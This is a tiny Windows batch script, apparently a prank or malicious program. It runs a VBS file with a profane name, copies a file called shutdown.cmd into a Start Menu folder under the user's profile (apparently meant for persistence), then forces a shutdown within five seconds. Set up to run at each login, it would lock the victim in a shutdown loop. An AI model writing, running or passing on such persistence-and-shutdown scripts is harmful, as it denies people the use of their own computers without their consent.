@echo off

"fucked.vbs"
copy shutdown.cmd C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs
shutdown.exe -s -t 05 -c "Shutdown"
exit
